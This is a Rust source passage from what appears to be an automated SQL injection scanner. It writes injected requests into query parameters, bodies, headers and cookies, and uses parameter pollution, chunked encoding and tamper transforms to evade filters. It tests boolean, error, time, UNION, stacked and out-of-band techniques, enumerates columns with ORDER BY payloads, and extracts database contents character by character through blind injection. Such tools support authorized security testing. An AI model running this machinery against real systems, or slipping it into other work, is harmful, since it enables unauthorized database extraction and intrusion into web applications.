            http::HeaderValue::from_static("application/x-www-form-urlencoded"),
        );
        if let Some(r) = raw {
            for (k, v) in &r.headers {
                if k.eq_ignore_ascii_case("content-type")
                    || k.eq_ignore_ascii_case("content-length")
                {
                    continue;
                }
                if let (Ok(name), Ok(val)) = (
                    http::HeaderName::from_bytes(k.as_bytes()),
                    http::HeaderValue::from_str(v),
                ) {
                    headers.insert(name, val);
                }
            }
        }
        return (method, body_str, headers);
    }
    let body_str = if let Some(body) = existing_body {
        // Preserve other body fields, replace only target param
        let mut pairs: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
            .map(|(k, v)| (k.into_owned(), v.into_owned()))
            .collect();
        let mut found = false;
        for (k, v) in &mut pairs {
            if k == &param.name {
                *v = payload.to_owned();
                found = true;
            }
        }
        if !found {
            pairs.push((param.name.clone(), payload.to_owned()));
        }
        url::form_urlencoded::Serializer::new(String::new())
            .extend_pairs(pairs)
            .finish()
    } else {
        format!(
            "{}={}",
            param.name,
            url::form_urlencoded::byte_serialize(payload.as_bytes()).collect::<String>()
        )
    };
    let mut headers = http::HeaderMap::new();
    headers.insert(
        http::header::CONTENT_TYPE,
        http::HeaderValue::from_static("application/x-www-form-urlencoded"),
    );
    // Preserve other headers from raw request (e.g., Host, User-Agent)
    if let Some(r) = raw {
        for (k, v) in &r.headers {
            if k.eq_ignore_ascii_case("content-type") || k.eq_ignore_ascii_case("content-length") {
                continue;
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(k.as_bytes()),
                http::HeaderValue::from_str(v),
            ) {
                headers.insert(name, val);
            }
        }
    }
    (method, body_str, headers)
}

fn request_spec_from_raw(target: &TargetUrl, raw: &RawRequest) -> RequestSpec {
    let method = Method::from_bytes(raw.method.as_bytes()).unwrap_or(Method::GET);
    let mut headers = http::HeaderMap::new();
    for (k, v) in &raw.headers {
        if k.eq_ignore_ascii_case("content-length") || k.eq_ignore_ascii_case("host") {
            continue;
        }
        if let (Ok(name), Ok(value)) = (
            http::HeaderName::from_bytes(k.as_bytes()),
            http::HeaderValue::from_str(v),
        ) {
            headers.insert(name, value);
        }
    }
    let mut spec = RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers);
    if let Some(body) = &raw.body {
        spec = spec.with_body(body.as_bytes().to_vec());
    }
    spec
}

fn build_injection_spec_with_raw(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
    raw: Option<&crate::target::raw_request::RawRequest>,
    opts: ProbeOpts,
) -> RequestSpec {
    if marker_set.has_any() && param.name.starts_with("marker_") {
        let url = inject_with_marker(target_str, payload, marker_set);
        // Preserve method from raw request if available
        let method = raw
            .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
            .unwrap_or(Method::GET);
        return RequestSpec::new(method, url);
    }
    match &param.location {
        ParameterLocation::Query => {
            let url = if opts.hpp {
                hpp_query_url(target.inner(), &param.name, payload)
            } else {
                inject_param(target, param, payload)
            };
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, url)
        }
        ParameterLocation::Body => {
            let (method, body_str, mut headers) = inject_body_param(raw, param, payload, opts.hpp);
            if should_apply_chunked(true, opts.chunked) {
                headers.remove(http::header::CONTENT_LENGTH);
                headers.insert(
                    http::header::TRANSFER_ENCODING,
                    http::HeaderValue::from_static("chunked"),
                );
            }
            RequestSpec::new(method, target.as_str().to_owned())
                .with_headers(headers)
                .with_body(body_str.into_bytes())
        }
        ParameterLocation::Header(h) => {
            let mut headers = http::HeaderMap::new();
            // Preserve existing headers from raw request
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(h.as_bytes()),
                http::HeaderValue::from_str(payload),
            ) {
                headers.insert(name, val);
            }
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
        }
        ParameterLocation::Cookie => {
            let mut headers = http::HeaderMap::new();
            // Preserve existing headers, but rebuild Cookie header to preserve other cookies
            let mut cookies: Vec<(String, String)> = Vec::new();
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if k.eq_ignore_ascii_case("cookie") {
                        for part in v.split(';') {
                            if let Some((ck, cv)) = part.trim().split_once('=') {
                                cookies.push((ck.trim().to_owned(), cv.trim().to_owned()));
                            }
                        }
                    } else if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            // Replace or insert target cookie
            let mut found = false;
            for (ck, cv) in &mut cookies {
                if ck == &param.name {
                    *cv = payload.to_owned();
                    found = true;
                }
            }
            if !found {
                cookies.push((param.name.clone(), payload.to_owned()));
            }
            let cookie_val = cookies
                .into_iter()
                .map(|(k, v)| format!("{k}={v}"))
                .collect::<Vec<_>>()
                .join("; ");
            if let Ok(val) = http::HeaderValue::from_str(&cookie_val) {
                headers.insert(http::header::COOKIE, val);
            }
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn fetch_for_payload(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    opts: ProbeOpts,
) -> (String, f64) {
    let spec =
        build_injection_spec_with_raw(target, target_str, param, payload, marker_set, raw, opts);
    let start = Instant::now();
    let resp = client.send_with_retry(spec, cancel).await;
    let elapsed = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            #[allow(clippy::unwrap_used)]
            let body = r.text().await.unwrap_or_default();
            (body, elapsed)
        }
        Err(_) => (String::new(), elapsed),
    }
}

#[allow(dead_code)]
async fn fetch_body_and_time(
    client: &HttpClient,
    url: &str,
    state: &Arc<RwLock<SessionState>>,
) -> (String, f64) {
    let start = Instant::now();
    let resp = client.get_with_retry(url.to_owned()).await;
    let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            let body = r.text().await.unwrap_or_default();
            (body, elapsed_ms)
        }
        Err(_) => (String::new(), elapsed_ms),
    }
}

#[allow(dead_code)]
async fn fetch_body_and_time_spec(
    client: &HttpClient,
    url: String,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
) -> (String, f64) {
    let start = Instant::now();
    let spec = RequestSpec {
        method: Method::GET,
        url,
        headers: http::HeaderMap::new(),
        body: None,
    };
    let resp = client.send_with_retry(spec, cancel).await;
    let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            #[allow(clippy::unwrap_used)]
            let body = r.text().await.unwrap_or_default();
            (body, elapsed_ms)
        }
        Err(_) => (String::new(), elapsed_ms),
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_boolean_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
) {
    let payloads = boolean_payloads_for(None);
    let detector = BooleanDetector::new();
    let baseline_body = baseline.representative_body_str();
    let tamper_sets = tamper_transformation_sets(tampers);
    for p in payloads.iter().take(2) {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let true_payload = apply_tampers(&p.true_payload, trans);
            let false_payload = apply_tampers(&p.false_payload, trans);
            // Skip duplicate variants already tried for this base payload
            // (dedupe via string equality already handled by transformation sets, but
            // randomcase produces different strings per call — we still try each set once)
            let tamper_label = if trans.is_empty() {
                "none".to_owned()
            } else {
                trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
            };
            // 3 trials confirmation
            let mut trials: Vec<(bool, f64)> = Vec::with_capacity(3);
            let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
            for _ in 0..3 {
                if cancel.is_cancelled() {
                    break;
                }
                let (true_body, true_ms) = fetch_for_payload(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &true_payload,
                    marker_set,
                    raw,
                    opts,
                )
                .await;
                let (false_body, false_ms) = fetch_for_payload(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &false_payload,
                    marker_set,
                    raw,
                    opts,
                )
                .await;
                let res = detector.evaluate(
                    &baseline_body,
                    &true_body,
                    &false_body,
                    baseline.mean_ms,
                    true_ms,
                    false_ms,
                );
                trials.push((res.is_vulnerable, res.confidence));
                last_res = Some(res);
            }
            let conf = confirmation::confirm(&trials);
            if conf.confirmed {
                let res = last_res.unwrap_or_else(|| {
                    detector.evaluate(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
                });
                let evidence = format!(
                    "boolean true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}",
                    res.true_similarity,
                    res.false_similarity,
                    conf.trials,
                    conf.false_positive_prob,
                    tamper_label,
                    opts.evidence_suffix()
                );
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Boolean,
                    conf.score,
                    evidence,
                );
                finding.dbms = None;
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_error_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
) {
    let detector = ErrorDetector::new();
    let payloads = crate::techniques::error::payloads::error_payloads_for(None);
    let tamper_sets = tamper_transformation_sets(tampers);
    for p in payloads.iter().take(2) {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let tampered = apply_tampers(&p.payload, trans);
            let (body, _ms) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
            )
            .await;
            let r = detector.evaluate(&body);
            if r.is_vulnerable {
                let tamper_label = if trans.is_empty() {
                    "none".to_owned()
                } else {
                    trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
                };
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Error,
                    r.confidence,
                    format!(
                        "error pattern {:?} tamper={}{}",
                        r.matched_pattern,
                        tamper_label,
                        opts.evidence_suffix()
                    ),
                );
                finding.dbms = Some(p.dbms.clone());
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_time_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
) {
    let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
    let base = time_payload_for(None, 3.0);
    let sets = tamper_transformation_sets(tampers);
    for trans in &sets {
        if cancel.is_cancelled() {
            break;
        }
        let payload_str = apply_tampers(&base.payload, trans);
        let (_body, ms) = fetch_for_payload(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &payload_str,
            marker_set,
            raw,
            opts,
        )
        .await;
        let r = detector.evaluate(ms, base.sleep_secs);
        if r.is_vulnerable {
            let tamper_label = if trans.is_empty() {
                "none".to_owned()
            } else {
                trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
            };
            let finding = Finding::new(
                target.as_str(),
                param.key(),
                TechniqueKind::Time,
                r.confidence,
                format!(
                    "time delay {:.0}ms > threshold {:.0}ms tamper={}{}",
                    r.measured_ms,
                    detector.threshold(),
                    tamper_label,
                    opts.evidence_suffix()
                ),
            );
            state.write().await.push_finding(finding);
            break;
        }
    }
}

/// Enumerate column count via ORDER BY probing before UNION.
/// Sequential probing `ORDER BY 1 .. MAX`, stops at first error detected by
/// `UnionDetector::evaluate_order_by`. Returns `Some(n)` where `n = failed_index - 1`.
/// Rate limiting and jitter are preserved via `fetch_for_payload`; cancellation is honoured.
#[allow(clippy::too_many_arguments)]
async fn enumerate_columns_via_order_by(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    detector: &UnionDetector,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
) -> Option<usize> {
    const MAX_ORDER_BY_COLS: usize = 10;
    let sets = tamper_transformation_sets(tampers);
    for i in 1..=MAX_ORDER_BY_COLS {
        if cancel.is_cancelled() {
            return None;
        }
        let base = format!("' ORDER BY {i} -- -");
        let mut triggered = false;
        for trans in &sets {
            if cancel.is_cancelled() {
                return None;
            }
            let payload = apply_tampers(&base, trans);
            let (body, _ms) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &payload, marker_set, raw, opts,
            )
            .await;
            if detector.evaluate_order_by(&body) {
                triggered = true;
                break;
            }
        }
        if triggered {
            if i == 1 {
                warn!("ORDER BY 1 already errored — ORDER BY enumeration inconclusive");
                return None;
            }
            let inferred = i - 1;
            info!(inferred, "ORDER BY enumeration inferred column count");
            return Some(inferred);
        }
    }
    info!("ORDER BY enumeration found no error up to {MAX_ORDER_BY_COLS} — undetermined");
    None
}

#[allow(clippy::too_many_arguments)]
async fn test_union_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
) {
    let detector = UnionDetector::new();
    let baseline_body = baseline.representative_body_str();
    let tamper_sets = tamper_transformation_sets(tampers);

    // Phase 0 — ORDER BY enumeration to reduce false positives.
    // If we successfully infer `n`, we test only `n` first. If that fails, we
    // still fall back to the heuristic list (excluding the already-tried `n`) to
    // keep coverage for edge cases where ORDER BY is WAF-filtered but UNION still works.
    let inferred = enumerate_columns_via_order_by(
        client, state, cancel, target, target_str, param, marker_set, &detector, raw, tampers, opts,
    )
    .await;

    let mut cols_to_try: Vec<usize> = Vec::new();
    let mut fallback = vec![3usize, 2, 4, 5];
    if let Some(n) = inferred {
        cols_to_try.push(n);
        // Keep fallback for resilience but avoid duplicate probe
        fallback.retain(|c| *c != n);
    } else {
        cols_to_try = fallback.clone();
        fallback.clear();
    }

    // Primary pass: inferred or heuristic
    for cols in &cols_to_try {
        if cancel.is_cancelled() {
            return;
        }
        let cols = *cols;
        let payloads = union_payloads_for(None, cols);
        for p in payloads.iter().take(1) {
            if cancel.is_cancelled() {
                return;
            }
            for trans in &tamper_sets {
                if cancel.is_cancelled() {
                    return;
                }
                let tampered = apply_tampers(&p.payload, trans);
                let (body, ms) = fetch_for_payload(
                    client, state, cancel, target, target_str, param, &tampered, marker_set, raw,
                    opts,
                )
                .await;
                let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
                if r.is_vulnerable {
                    let tamper_label = if trans.is_empty() {
                        "none".to_owned()
                    } else {
                        trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
                    };
                    let mut finding = Finding::new(
                        target.as_str(),
                        param.key(),
                        TechniqueKind::Union,
                        r.confidence,
                        format!(
                            "union columns={:?} payload={} order_by_inferred={:?} tamper={}{}",
                            r.columns,
                            tampered,
                            inferred,
                            tamper_label,
                            opts.evidence_suffix()
                        ),
                    );
                    finding.dbms = Some(p.dbms.clone());
                    state.write().await.push_finding(finding);
                    return;
                }
            }
        }
    }

    // Secondary pass: fallback heuristic if primary (inferred) yielded nothing
    for cols in fallback {
        if cancel.is_cancelled() {
            break;
        }
        let payloads = union_payloads_for(None, cols);
        for p in payloads.iter().take(1) {
            if cancel.is_cancelled() {
                break;
            }
            for trans in &tamper_sets {
                if cancel.is_cancelled() {
                    break;
                }
                let tampered = apply_tampers(&p.payload, trans);
                let (body, ms) = fetch_for_payload(
                    client, state, cancel, target, target_str, param, &tampered, marker_set, raw,
                    opts,
                )
                .await;
                let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
                if r.is_vulnerable {
                    let tamper_label = if trans.is_empty() {
                        "none".to_owned()
                    } else {
                        trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
                    };
                    let mut finding = Finding::new(
                        target.as_str(),
                        param.key(),
                        TechniqueKind::Union,
                        r.confidence,
                        format!(
                            "union columns={:?} payload={} order_by_inferred={:?} (fallback) tamper={}{}",
                            r.columns,
                            tampered,
                            inferred,
                            tamper_label,
                            opts.evidence_suffix()
                        ),
                    );
                    finding.dbms = Some(p.dbms.clone());
                    state.write().await.push_finding(finding);
                    return;
                }
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_stacked_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
) {
    let detector = StackedDetector::new();
    let baseline_body = baseline.representative_body_str();
    let payloads = stacked_payloads_for(None);
    let tamper_sets = tamper_transformation_sets(tampers);
    for p in payloads.iter().take(2) {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let tampered = apply_tampers(&p.payload, trans);
            let (body, ms) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
            )
            .await;
            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, p);
            if r.is_vulnerable {
                let tamper_label = if trans.is_empty() {
                    "none".to_owned()
                } else {
                    trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
                };
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Stacked,
                    r.confidence,
                    format!(
                        "stacked dbms={} marker={} tamper={}{}",
                        r.dbms.as_deref().unwrap_or("?"),
                        p.marker,
                        tamper_label,
                        opts.evidence_suffix()
                    ),
                );
                finding.dbms = r.dbms.clone();
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

/// OOB detection: send DNS/HTTP probes embedding a unique token, then poll the
/// collaborator for the callback.
///
/// OPT-IN: skipped silently when `oob_domain` is `None` (no infra). Invalid
/// domains are rejected with a warning. Without `oob_poll_url` probes are
/// still sent but never auto-confirmed — the operator checks the collaborator
/// UI manually for `<token>.<domain>` (no finding is emitted without
/// evidence, to avoid false positives).
///
/// Flow per parameter: one fresh token, up to 3 DBMS-generic probes (each
/// with tamper variants), cancellable wait for the async DB-side query,
/// then poll (`HttpPollVerifier` or `NoopVerifier`). A finding
/// (`TechniqueKind::Oob`, confidence 0.95) is pushed only on callback.
#[allow(clippy::too_many_arguments)]
async fn test_oob_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    oob_domain: Option<String>,
    oob_poll_url: Option<String>,
    oob_wait_secs: u64,
) {
    let Some(domain) = oob_domain else {
        return;
    };
    if !is_valid_oob_domain(&domain) {
        warn!(domain=%domain, "invalid --oob-domain, skipping OOB probes");
        return;
    }
    let token = new_token();
    let detector = OobDetector::new(domain.clone());
    let baseline_body = baseline.representative_body_str();
    let payloads = oob_payloads_for(None, &domain, &token);
    let tamper_sets = tamper_transformation_sets(tampers);
    let has_poll_url = oob_poll_url
        .as_deref()
        .is_some_and(|u| !u.trim().is_empty());

    // Phase 1 — send probes (one token shared so a single poll correlates any
    // DBMS vector). Cap at 3 payloads x tamper variants to bound requests.
    // Keep the last response for evidence; OOB is async so the body is
    // expected to match baseline.
    let mut last_body = baseline_body.clone();
    let mut last_ms = baseline.mean_ms;
    let mut last_payload_idx = 0usize;
    let mut probes_sent = 0usize;
    for (pi, p) in payloads.iter().take(3).enumerate() {
        if cancel.is_cancelled() {
            return;
        }
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                return;
            }
            let tampered = apply_tampers(&p.payload, trans);
            let (body, ms) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
            )
            .await;
            probes_sent += 1;
            last_body = body;
            last_ms = ms;
            last_payload_idx = pi;
            if !has_poll_url {
                // Without confirmation infra one variant per payload is enough;
                // the operator checks the collaborator UI manually.
                break;
            }
        }
    }
    if probes_sent == 0 {
        return;
    }

    if !has_poll_url {
        let p = &payloads[last_payload_idx.min(payloads.len().saturating_sub(1))];
        let r = detector.evaluate_without_callback(
            &baseline_body,
            &last_body,
            baseline.mean_ms,
            last_ms,
            p,
        );
        if r.confidence >= 0.35 {
            info!(
                token=%p.token,
                fqdn=%p.fqdn,
                channel=%p.channel.to_string(),
                "oob probe sent (no --oob-poll-url) — check collaborator for callback, no auto-finding"
            );
        }
        return;
    }

    // Phase 2 — single wait + poll for the shared token (async DB execution
    // + collaborator propagation lag). Bounded: 1 wait + up to 3 polls.
    let wait = core::time::Duration::from_secs(oob_wait_secs.clamp(0, 30));
    if !wait.is_zero() {
        tokio::select! {
            () = cancel.cancelled() => return,
            () = tokio::time::sleep(wait) => {},
        }
    }
    let poll_verifier = crate::techniques::oob::verifier::HttpPollVerifier::new(
        oob_poll_url.clone().unwrap_or_default(),
        8,
    );
    let mut callback_seen = false;
    for _ in 0..3 {
        if cancel.is_cancelled() {
            return;
        }
        use crate::techniques::oob::verifier::OobVerifier as _;
        if poll_verifier.verify(&token).await {
            callback_seen = true;
            break;
        }
        tokio::select! {
            () = cancel.cancelled() => return,
            () = tokio::time::sleep(core::time::Duration::from_secs(2)) => {},
        }
    }
    let p = &payloads[last_payload_idx.min(payloads.len().saturating_sub(1))];
    let r = detector.evaluate_with_callback(
        &baseline_body,
        &last_body,
        baseline.mean_ms,
        last_ms,
        p,
        callback_seen,
    );
    if r.is_vulnerable {
        let mut finding = crate::session::state::Finding::new(
            target.as_str(),
            param.key(),
            crate::session::state::TechniqueKind::Oob,
            r.confidence,
            format!(
                "oob channel={} dbms={} token={} fqdn={} probes={}{}",
                r.channel,
                r.dbms.as_deref().unwrap_or("?"),
                r.token,
                p.fqdn,
                probes_sent,
                opts.evidence_suffix(),
            ),
        );
        finding.dbms = r.dbms.clone();
        state.write().await.push_finding(finding);
    }
}

/// Helper to extract a single field (databases, tables, columns, dump, count) via boolean-based blind SQLi.
/// Uses binary search on ASCII values with the provided query.
#[allow(clippy::too_many_arguments)]
async fn extract_enum_field(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    baseline_body: &str,
    baseline_mean: f64,
    query: String,
    label: String,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
) -> Option<String> {
    let engine = crate::extraction::engine::ExtractionEngine::new(
        crate::extraction::engine::ExtractionConfig::default(),
    );

    // First infer length (max 500 chars for enum results)
    let mut inferred_len = 0;
    for len_guess in 1..=500 {
        if cancel.is_cancelled() {
            break;
        }
        let base = format!("' AND LENGTH(({query}))>={len_guess} -- -");
        let payload = apply_tampers(&base, tampers);
        let spec = build_injection_spec_with_raw(
            target, target_str, param, &payload, marker_set, raw, opts,
        );
        let start = std::time::Instant::now();
        let resp = client.send_with_retry(spec, cancel).await;
        let ms = start.elapsed().as_secs_f64() * 1000.0;
        state.write().await.increment_requests();
        let body = match resp {
            Ok(r) => r.text().await.unwrap_or_default(),
            Err(_) => String::new(),
        };
        let diff = crate::detection::response_diff::diff_against_baseline(
            baseline_body,
            &body,
            baseline_mean,
            ms,
            100.0,
        );
        if diff.confidence < 0.4 {
            inferred_len = len_guess;
        } else {
            break;
        }
    }
    if inferred_len == 0 {
        warn!(label=%label, "enumeration length inference failed");
        return None;
    }

    let client_clone = client.clone();
    let state_clone = Arc::clone(state);
    let cancel_clone = cancel.clone();
    let target_clone = target.clone();
    let target_str_clone = target_str.to_owned();
    let param_clone = param.clone();
    let marker_set_clone = marker_set.clone();
    let baseline_body_clone = baseline_body.to_owned();
    let baseline_mean_clone = baseline_mean;
    let query_for_oracle = query.clone();
    let raw_for_oracle = raw.cloned();
    let tampers_for_oracle = tampers.to_vec();

    let oracle = move |pos: usize, mid: u8| {
        let client = client_clone.clone();
        let state = state_clone.clone();
        let cancel = cancel_clone.clone();
        let target = target_clone.clone();
        let target_str = target_str_clone.clone();
        let param = param_clone.clone();
        let marker_set = marker_set_clone.clone();
        let baseline_body = baseline_body_clone.clone();
        let query = query_for_oracle.clone();
        let raw = raw_for_oracle.clone();
        let tampers = tampers_for_oracle.clone();
        async move {
            let base = format!(
                "' AND ASCII(SUBSTRING(({query}),{},1))>={} -- -",
                pos + 1,
                mid
            );
            let payload = apply_tampers(&base, &tampers);
            let spec = build_injection_spec_with_raw(
                &target,
                &target_str,
                &param,
                &payload,
                &marker_set,
                raw.as_ref(),
                opts,
            );
            let start = std::time::Instant::now();
            let resp = client.send_with_retry(spec, &cancel).await;
            let ms = start.elapsed().as_secs_f64() * 1000.0;
            state.write().await.increment_requests();
            let body = match resp {
                Ok(r) => r.text().await.unwrap_or_default(),
                Err(_) => String::new(),
            };
            let diff = crate::detection::response_diff::diff_against_baseline(
                &baseline_body,
                &body,
                baseline_mean_clone,
                ms,
                100.0,
            );
            diff.confidence < 0.4
        }
    };

    let extracted = engine.extract(inferred_len, oracle).await;
    let exposed = {
        use secrecy::ExposeSecret;
        extracted.expose_secret().to_owned()
    };
    info!(label=%label, extracted=%crate::session::scrubber::Scrubber::hash_truncated(&exposed), len=%exposed.len(), "enumeration extracted");
    Some(exposed)
}
